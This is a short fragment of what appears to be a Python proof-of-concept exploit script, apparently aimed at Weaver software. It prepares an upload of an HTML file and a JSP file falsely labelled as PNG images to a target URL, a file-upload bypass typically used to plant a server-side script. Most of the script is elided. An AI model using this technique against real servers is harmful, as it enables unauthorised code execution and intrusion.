...
def main(target_url):
    ...
    file1 = [('file1', ('index123.html', open('main/weaver/poc/bin/index123.html', 'rb'), 'image/png'))]
    file2 = [('file1', ('index123.jsp', open('main/weaver/poc/bin/index123.jsp', 'rb'), 'image/png'))]
